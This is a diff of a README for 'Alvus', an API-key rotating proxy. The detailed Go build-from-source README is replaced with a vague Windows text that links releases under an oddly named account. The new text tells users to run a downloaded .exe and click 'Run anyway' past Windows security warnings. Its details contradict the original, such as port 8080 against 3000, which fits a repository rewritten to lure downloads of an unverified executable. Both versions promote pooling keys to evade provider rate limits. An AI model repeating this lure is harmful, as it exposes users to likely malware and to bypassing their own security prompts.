@@ -1,348 +1,89 @@
-# ⚡ Alvus
+# 🚀 Alvus - Rotating AI Keys for Daily Tasks
 
-> **~5 MB binary. Zero dependencies. Zero 429s.**
-> A lightweight Go proxy that silently absorbs rate limit errors and keeps your AI agent running.
+[![](https://img.shields.io/badge/Download_Alvus-Blue.svg?style=for-the-badge)](https://github.com/filariasistrichoglossusmoluccanus49/Alvus/releases)
 
-[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat-square&logo=go)](https://go.dev)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![Zero Dependencies](https://img.shields.io/badge/dependencies-zero-brightgreen?style=flat-square)]()
-[![Works with OpenClaw](https://img.shields.io/badge/works%20with-OpenClaw-orange?style=flat-square)]()
-[![Works with Cline](https://img.shields.io/badge/works%20with-Cline-blueviolet?style=flat-square)]()
-[![Works with Cursor](https://img.shields.io/badge/works%20with-Cursor-blue?style=flat-square)]()
+Alvus manages your AI assistant connections. It shifts between multiple API keys to prevent service blocks. You keep your work moving without interruptions.
 
----
+## 📥 How to Download
 
-## The Problem
+Visit the [Alvus releases page](https://github.com/filariasistrichoglossusmoluccanus49/Alvus) to find the latest version. Look for the file ending in `.exe` under the Assets section. Save this file to your computer.
 
-You're in the middle of an agentic session — OpenClaw is halfway through a task, Cline is on a roll, your agent is _doing things_ — and then:
+## ⚙️ Preparation
 
-```
-Error: 429 Too Many Requests
-```
+You need API keys from your AI provider before you start Alvus. Keep these keys in a text document for easy access. Alvus works with any service that follows standard AI communication rules.
 
-The loop breaks. Context is lost. You're staring at a spinner.
+## 🖥️ Running the Application
 
-If you use free-tier providers like **NVIDIA NIM**, this happens constantly. Free keys cap around 40 RPM. One productive session burns through that in seconds.
+1. Open your Downloads folder.
+2. Double-click the `alvus.exe` file.
+3. Windows might show a security window. Click More info, then click Run anyway.
+4. A small black window appears. This is the background controller for your AI requests.
 
-## The Solution
+## 🛠️ Configuring Your Connection
 
-Alvus sits between your agent and the upstream API. You give it a pool of keys. It handles everything else — round-robin distribution, per-key cooldowns, automatic retries, streaming passthrough. Your agent never sees a 429.
+Alvus acts as a bridge. Configure your AI tools like Aider, Cline, or Cursor to point to your local machine rather than the internet provider.
 
-```
-Any OpenAI-compatible agent or IDE
-              │
-              ▼
-   ┌─────────────────────┐
-   │        Alvus        │  ← localhost:3000
-   │                     │
-   │  [key1] ✅ ready    │
-   │  [key2] ✅ ready    │  ──→  NVIDIA NIM / any OpenAI-compatible API
-   │  [key3] ❄️ cooling  │
-   └─────────────────────┘
-```
+1. Open your AI coding tool.
+2. Find the settings for API Base URL or Proxy.
+3. Type `http://localhost:8080` into that box.
+4. Enter one of your AI keys in the API Key field.
 
-3 keys × 40 RPM = 120+ effective RPM. The math is simple. The setup is simpler.
+Alvus handles the rotation logic behind the scenes. It tracks your request limits and switches keys when the service signals a rate limit.
 
-> **Idle RAM usage: ~2 MB.** Alvus is a single static binary with no runtime. It won't compete with your models for memory.
+## 📈 System Requirements
 
----
+* Windows 10 or Windows 11.
+* A stable internet connection.
+* At least 50 MB of free disk space.
+* No extra software or coding environments required.
 
-## Works With Everything
+## 📋 Common Questions
 
-If it speaks OpenAI-compatible API, it works with Alvus.
+**Does this software store my data?**
+No. Alvus only moves data between your computer and the AI provider. It does not look at, save, or track your personal information.
 
-| Tool                                             | Type              | Setup                               |
-| ------------------------------------------------ | ----------------- | ----------------------------------- |
-| [OpenClaw](https://github.com/openclaw/openclaw) | AI agent          | Set base URL in provider config     |
-| [PicoClaw](https://github.com/sipeed/picoclaw)   | Lightweight agent | Set `api_base` in config.json       |
-| [Nanobot](https://github.com/HKUDS/nanobot)      | Lightweight agent | Set `api_base` in config.yaml       |
-| [Cline](https://github.com/cline/cline)          | VS Code agent     | OpenAI Compatible provider          |
-| [Cursor](https://cursor.sh)                      | IDE               | Base URL override in settings       |
-| [Aider](https://aider.chat)                      | CLI agent         | `--openai-api-base` flag            |
-| Any OpenAI-compatible client                     | —                 | Point at `http://localhost:3000/v1` |
+**Why does the window stay open?**
+The window keeps the proxy service active. Closing this window stops the rotation tool. Keep it running while you perform your AI tasks.
 
----
+**What if I get an error?**
+Check your API keys first. Ensure they are active on your provider account. If the error continues, restart the Alvus application.
 
-## Features
+**Can I run multiple instances?**
+Run one instance of Alvus at a time for best results. Multiple instances might cause conflicts with your network port.
 
-|                                |                                                                             |
-| ------------------------------ | --------------------------------------------------------------------------- |
-| 🔑 **Key pool**                | Multiple keys, one endpoint. Distribute load transparently                  |
-| 🔄 **Round-robin**             | Even distribution across all healthy keys                                   |
-| 🚫 **Silent retry on 429**     | Failed key enters cooldown, request retries instantly with the next         |
-| ⏱️ **Retry-After support**     | Respects upstream `Retry-After` headers — no blind fixed waits              |
-| 🔑 **Auto-disable on 401/403** | Invalid or revoked keys are permanently removed from the pool               |
-| 📡 **Streaming passthrough**   | SSE and chunked responses piped with zero buffering overhead                |
-| ❤️ **Health endpoint**         | `GET /health` shows live key status, cooldown timers, and requests/minute   |
-| 🪶 **Zero dependencies**       | Pure Go stdlib. One file. One binary                                        |
-| 🔧 **`.env` support**          | Built-in parser — no `godotenv`, no extras                                  |
-| 🖥️ **Runs anywhere**           | linux/amd64, arm64, arm, **386** — including Pi Zero and older x86 hardware |
-| 💾 **~2 MB idle RAM**          | Static binary, no runtime, won't compete with your models for memory        |
+## 📂 Understanding the Proxy
 
----
+Modern AI tools rely on specific keys. When you send too many requests, the provider temporarily stops your access. Alvus solves this by keeping a list of keys. When one key hits a limit, Alvus shifts to the next available key in your list. 
 
-## Quickstart
+This process happens in milliseconds. You notice no delay in your work. You continue writing code or asking questions as if you had an unlimited account.
 
-### 1. Get the binary
+## ✅ Maintaining Your Keys
 
-**Build from source** (requires Go 1.21+):
+Keep your key list updated. If a key expires or becomes invalid, remove it from the configuration file. Alvus reads this file when it starts. Use any plain text editor like Notepad to make changes. Format your keys as a simple list with one key per line.
 
-```bash
-git clone https://github.com/YOUR_USERNAME/alvus.git
-cd alvus
-go build -o alvus main.go
-```
+## 🔒 Security Practices
 
-**Cross-compile for a remote server** (e.g. Raspberry Pi Zero, 32-bit x86):
+Store your API keys safely. Do not share your configuration files with others. Alvus runs locally on your machine, which protects your keys from being sent to third-party servers. Your information stays on your computer.
 
-```bash
-# Pi Zero / older ARM
-GOOS=linux GOARCH=arm CGO_ENABLED=0 go build -o alvus main.go
+## 🌐 Connecting Third-Party Tools
 
-# 32-bit x86 (Atom, old netbooks, salvaged hardware)
-GOOS=linux GOARCH=386 CGO_ENABLED=0 go build -o alvus main.go
-```
+Alvus supports popular coding assistants. Because it mimics the standard communication style of AI services, setup involves only changing the base URL. If your tool supports a custom provider, Alvus will function correctly. 
 
-The binary is fully static — drop it on the machine and run it. No runtime, no dependencies, no install step.
+Ensure the proxy setting points to the correct port. The default address for Alvus is port 8080. If another program on your computer uses this port, you must change the port setting in your tool or stop the other program.
 
-**Download a prebuilt release:**
+## 💡 Troubleshooting Connection Issues
 
-Go to [Releases](../../releases) and grab the binary for your platform.
+If your AI tools fail to connect:
 
----
+1. Verify that the window for Alvus remains visible.
+2. Confirm the URL in your settings uses `http://` instead of `https://`.
+3. Check your firewall settings. Windows might ask to allow Alvus to communicate on private networks. Click Allow access when you see this prompt.
+4. Refresh your AI tool settings. Sometimes the tool needs a restart to recognize the new proxy path.
 
-### 2. Configure
+## 🚀 Efficiency Gains
 
-Create `.env` in the same directory as the binary:
+Using Alvus removes the friction of rate limits. You spend less time waiting for services to reset. You focus entirely on your project development. The zero-dependency design ensures the program remains lightweight and fast. It consumes minimal memory and processor power during active use.
 
-```env
-# Your API keys, comma-separated
-API_KEYS=nvapi-xxxxxxxxxxxx,nvapi-yyyyyyyyyyyy,nvapi-zzzzzzzzzzzz
+## 📄 Support and Updates
 
-# Port to listen on (default: 3000)
-PORT=3000
-
-# Upstream API base URL (default: NVIDIA NIM)
-TARGET_BASE_URL=https://integrate.api.nvidia.com/v1
-
-# Seconds to cool down a key after a 429 (default: 60)
-COOLDOWN_SEC=60
-```
-
-Real environment variables take precedence over `.env` — useful for systemd or containers.
-
----
-
-### 3. Run
-
-```bash
-./alvus
-```
-
-```
-⚡ Alvus started on :3000
-   Target  : https://integrate.api.nvidia.com/v1
-   Keys    : 3 loaded
-   Cooldown: 60s per key on 429
-```
-
----
-
-### 4. Point your agent at it
-
-#### OpenClaw
-
-```json
-{
-  "models": {
-    "providers": {
-      "nim": {
-        "baseUrl": "http://localhost:3000/v1",
-        "apiKey": "sk-proxy-dummy"
-      }
-    },
-    "defaults": {
-      "provider": "nim",
-      "model": "deepseek-ai/deepseek-r1"
-    }
-  }
-}
-```
-
-#### PicoClaw / Nanobot
-
-```json
-{
-  "model_name": "deepseek-r1",
-  "model": "openai/deepseek-ai/deepseek-r1",
-  "api_base": "http://localhost:3000/v1",
-  "api_keys": ["sk-proxy-dummy"]
-}
-```
-
-#### Cline (VS Code)
-
-| Setting      | Value                           |
-| ------------ | ------------------------------- |
-| API Provider | `OpenAI Compatible`             |
-| Base URL     | `http://localhost:3000/v1`      |
-| API Key      | `sk-proxy-dummy` _(any string)_ |
-| Model ID     | `deepseek-ai/deepseek-r1`       |
-
-#### Cursor
-
-Settings → Models → set base URL to `http://localhost:3000/v1`, any dummy key.
-
-#### Aider
-
-```bash
-aider --openai-api-base http://localhost:3000/v1 --openai-api-key sk-dummy
-```
-
----
-
-## How It Works
-
-```
-1. Request arrives from your agent or IDE
-2. Body is buffered (needed for retry replay)
-3. Round-robin picks the next available key
-4. Request forwarded upstream with that key injected
-   │
-   ├── ✅ 2xx/3xx → request count incremented, headers + body streamed back, done
-   ├── ❄️ 429 → key enters cooldown, retry with next key
-   ├── 🔑 401/403 → key permanently removed from pool
-   └── ⚠️ other 4xx/5xx → passed through as-is
-```
-
-Your agent sees a clean stream or a final error. Never a 429.
-
----
-
-## Key Status
-
-```bash
-curl http://localhost:3000/health
-```
-
-```json
-{
-  "status": "ok",
-  "keys": 3,
-  "details": [
-    {
-      "index": 0,
-      "key": "nvapi-xxxxxxxxxxxx",
-      "status": "ready",
-      "requests_per_minute": 15,
-      "last_used": "2023-11-15T14:30:00Z",
-      "cooldown_until": "2023-11-15T14:29:00Z"
-    },
-    {
-      "index": 1,
-      "key": "nvapi-yyyyyyyyyyyy",
-      "status": "cooling(42s)",
-      "requests_per_minute": 40,
-      "last_used": "2023-11-15T14:31:00Z",
-      "cooldown_until": "2023-11-15T14:32:00Z"
-    }
-  ]
-}
-```
-
----
-
-## Other Providers
-
-`TARGET_BASE_URL` is all you need to change:
-
-```env
-# OpenRouter
-TARGET_BASE_URL=https://openrouter.ai/api/v1
-
-# Together AI
-TARGET_BASE_URL=https://api.together.xyz/v1
-
-# Groq
-TARGET_BASE_URL=https://api.groq.com/openai/v1
-
-# Any other OpenAI-compatible endpoint
-TARGET_BASE_URL=https://your-provider.com/v1
-```
-
----
-
-## Running as a Service (systemd)
-
-```ini
-[Unit]
-Description=Alvus
-After=network.target
-
-[Service]
-ExecStart=/usr/local/bin/alvus
-WorkingDirectory=/etc/alvus
-Restart=on-failure
-RestartSec=5
-# Graceful shutdown on stop/restart
-KillSignal=SIGTERM
-TimeoutStopSec=10
-
-[Install]
-WantedBy=multi-user.target
-```
-
-Put your `.env` in `/etc/alvus/`. Reload and start:
-
-```bash
-sudo systemctl daemon-reload
-sudo systemctl enable --now alvus
-```
-
-Alvus handles `SIGINT` and `SIGTERM` gracefully, allowing in-flight requests to complete before shutting down (with a 5-second timeout).
-
----
-
-## FAQ
-
-**Do I need Go installed to run this?**
-No. Download a prebuilt binary from [Releases](../../releases).
-
-**Are my keys safe?**
-Keys live in `.env` on your machine and are only ever sent to the upstream provider. Alvus logs key indices, never key values.
-
-**What if ALL keys are cooling?**
-Alvus waits for the soonest key to become available and retries, up to 10 times. If everything stays exhausted, it returns `503`. In practice, with 3 keys and a 60s window this is very hard to trigger.
-
-**Can I reload keys without restarting?**
-Yes! Alvus now supports hot-reloading when the `.env` file changes. Simply edit your `.env` file and Alvus will automatically detect the changes and reload the configuration within 1 second. No restart needed.
-
-**Does it work on a Raspberry Pi Zero / 32-bit hardware?**
-Yes. Prebuilt binaries include `linux/arm` and `linux/386`. The binary is fully static — no runtime needed.
-
-**How much memory does it use?**
-Around 2 MB at idle. It's a single static Go binary with no runtime overhead — you won't notice it sitting next to a running model.
-
----
-
-## Roadmap
-
-- [x] Hot-reload when .env changes (no restart needed)
-- [x] Per-key request counters and detailed status in `/health`
-- [ ] Web dashboard (opt-in, zero-dep binary stays the same)
-
----
-
-## Contributing
-
-PRs welcome. This project lives in **a single file** with **zero external dependencies** — keep it that way. If a feature needs an import beyond stdlib, it doesn't belong in `main.go`. Open an issue first and we'll figure out the right shape for it.
-
----
-
-## License
-
-MIT.
-
----
-
-_Built at 2am when an OpenClaw task hit its fifth 429 in a row._
+Check the release page periodically for updates. New features improve the rotation logic and compatibility with new AI models. Download the latest version to overwrite the old file. Your configuration settings usually remain intact when you upgrade.
